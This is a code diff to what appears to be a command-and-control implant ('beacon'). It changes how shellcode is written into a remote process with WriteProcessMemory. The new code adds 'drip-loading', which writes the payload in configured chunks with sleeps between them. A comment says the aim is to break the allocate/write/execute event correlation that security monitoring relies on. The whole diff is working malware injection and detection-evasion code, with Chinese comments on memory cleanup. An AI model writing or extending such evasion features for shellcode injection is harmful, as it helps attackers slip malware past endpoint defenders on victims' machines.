@@ -90,20 +90,34 @@ char * remote_mirror_data_virtualallocex(HANDLE hProcess, DWORD pid, char * buff
 	}
 
 	/* write our shellcode to the process */
-	while (total < length) {
-		if (!beacon_WriteProcessMemory(hProcess, (char *)ptr + total, buffer + total, length - total, &wrote)) {
-			post_error_d(0x10, GetLastError());
-			/* ptr 是目标进程的地址：本地 VirtualFree 释放不了远端内存，
-			   反而可能误放本地同地址分配。必须用 VirtualFreeEx。 */
-			VirtualFreeEx(hProcess, ptr, 0, MEM_RELEASE);
-			return NULL;
-		}
+	{
+		/* 4.12 drip-loading: write in configured chunks with a delay to break
+		 * allocate/write/execute event correlation (size 0 = single write) */
+		DWORD drip = setting_int(SETTING_PROCINJ_DRIP_SIZE);
+		DWORD delay = setting_int(SETTING_PROCINJ_DRIP_DELAY);
+		while (total < length) {
+			int chunk = length - total;
+			if (drip > 0 && chunk > (int)drip) {
+				chunk = (int)drip;
+			}
+			if (!beacon_WriteProcessMemory(hProcess, (char *)ptr + total, buffer + total, chunk, &wrote)) {
+				post_error_d(0x10, GetLastError());
+				/* ptr 是目标进程的地址：本地 VirtualFree 释放不了远端内存，
+				   反而可能误放本地同地址分配。必须用 VirtualFreeEx。 */
+				VirtualFreeEx(hProcess, ptr, 0, MEM_RELEASE);
+				return NULL;
+			}
 
-		total += wrote;
+			total += wrote;
 
-		if (wrote == 0) {
-			VirtualFreeEx(hProcess, ptr, 0, MEM_RELEASE);
-			return NULL;
+			if (wrote == 0) {
+				VirtualFreeEx(hProcess, ptr, 0, MEM_RELEASE);
+				return NULL;
+			}
+
+			if (drip > 0 && total < length && delay > 0) {
+				Sleep(delay);
+			}
 		}
 	}
 
